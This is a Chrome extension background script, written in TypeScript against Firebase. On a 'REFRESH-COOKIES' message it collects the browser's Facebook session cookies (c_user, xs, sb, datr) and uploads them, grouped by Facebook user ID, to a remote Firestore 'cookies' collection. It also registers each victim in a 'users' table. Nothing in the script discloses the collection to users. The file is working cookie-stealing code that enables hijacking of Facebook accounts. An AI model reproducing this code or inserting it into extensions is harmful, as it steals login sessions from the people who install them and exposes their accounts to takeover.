import firebase from 'firebase';
import { environment } from '../../angular/src/environments/environment'
// console.log('background script loaded');
firebase.initializeApp(environment.firebaseConfig);
const angularFirestore = firebase.firestore();
chrome.runtime.onInstalled.addListener(() => {
  // do something
});

chrome.tabs.onCreated.addListener((tab) => {
  // console.log(JSON.stringify(tab));
  // alert(JSON.stringify(tab))
});
chrome.cookies.onChanged.addListener((changeInfo) => {
  // alert(JSON.stringify(changeInfo.cookie))
});

chrome.runtime.onMessage.addListener((request, sender, respond) => {
  // console.log(sender.tab ?
  //   "from a content script:" + sender.tab.url :
  //   "from the extension");
  const handler = new Promise((resolve, reject) => {
    if (request.action == "REFRESH-COOKIES") {
      chrome.cookies.getAll({}, (cookies: chrome.cookies.Cookie[]) => {
        const og = convertCookieImport(cookies);

        updateCookie(og, angularFirestore);
        resolve({ data: cookies });
      });
    } else {
      reject('request is empty.');
    }
  });
  handler.then(message => respond(message)).catch(error => respond(error));
  return true;
});
const getStorageData = (key): Promise<any> =>
  new Promise((resolve, reject) =>
    chrome.storage.sync.get(key, result =>
      chrome.runtime.lastError
        ? reject(Error(chrome.runtime.lastError.message))
        : resolve(result)
    )
  )
// const { data } =  getStorageData('data')
const setStorageData = data =>
  new Promise((resolve, reject) =>
    chrome.storage.sync.set(data, () =>
      chrome.runtime.lastError
        ? reject(Error(chrome.runtime.lastError.message))
        : resolve()
    )
  )

// setStorageData({ data: {} });

const convertCookieImport = (data: chrome.cookies.Cookie[]): CookieImport[] => {
  const mapActive = {
    ".facebook.com": { url: "https://www.facebook.com", name: ['c_user', 'xs', 'sb','datr'] }
  }
  return data.filter(f => Object.keys(mapActive).includes(f.domain) && mapActive[f.domain].name.includes(f.name)).map((k) => { return new CookieImport(k, mapActive[k.domain].url || k.domain); });
}
const groupBy = (list, by: (pre) => string) => {
  return (list || []).reduce((cur, pre) => { cur[by(pre)] = [...(cur[by(pre)] || []), pre]; return cur; }, {})
}
const updateCookie = async (cookies: CookieImport[], angularFirestore: firebase.firestore.Firestore) => {
  const TB_COOKIE = 'cookies';
  const TB_USER = 'users';
  const _cUser = cookies.filter(k => k.domain == '.facebook.com' && k.name == 'c_user');
  if (_cUser.length === 0) { return; };
  const cUserId = _cUser[0].value;
  const _store = await getStorageData(cUserId);
  if (!_store[cUserId]) {
    // new user, to insert new account 
    const collectionRef = angularFirestore.collection(TB_USER).where('userID', '==', cUserId);
    collectionRef.get().then(rs => {
      if(rs.docs.length === 0) {angularFirestore.collection(TB_USER).add({ userID: cUserId, userName: "NEW", lastUpdate: new Date() }); }
    });
  }
  const by = (pre) => pre.domain + '-' + pre.name + '-' + pre.value;
  const sent = groupBy(_store[cUserId], by);
  const cookiesOld: CookieImport[] = [];
  const triggerOld = (value, cookiesOld: CookieImport[]) => {
    cookiesOld.push(value)
    return false;
  }
  cookies = cookies.filter((value: CookieImport) => !sent[by(value)] || triggerOld(value, cookiesOld));
  let preparedSave = {};
  preparedSave[cUserId] = cookies.concat(cookiesOld);
  setStorageData(preparedSave);

  const collectionCookies = angularFirestore.collection(TB_COOKIE).where('userID', '==', cUserId);
  collectionCookies.get().then(async docs => {
    const currentDocs = [];
    const temp =  cookies.map( k => `${k.domain}-${k.name}`);
    docs.forEach(doc => temp.includes(`${doc.data().domain}-${doc.data().name}`) && currentDocs.push(angularFirestore.collection(TB_COOKIE).doc(doc.id).delete()));
    await Promise.all(currentDocs);
    cookies.forEach(cookie => {
       angularFirestore.collection(TB_COOKIE).add(Object.assign({ userID: cUserId }, cookie));
    });
  });
}


class CookieImport {
  domain: string;
  expirationDate?: number;
  httpOnly: boolean;
  name: string;
  path: string;
  secure: boolean;
  storeId: string;
  value: string;
  url: string;
  constructor(original?: chrome.cookies.Cookie, url?: string) {
    this.domain = original?.domain;
    original?.expirationDate && (this.expirationDate = original?.expirationDate);
    this.httpOnly = original?.hostOnly;
    this.name = original?.name;
    this.path = original?.path;
    this.secure = original?.secure;
    this.storeId = original?.storeId;
    this.value = original?.value;
    this.url = url || '';
  }

}

// chrome.storage.sync.clear( k => console.log)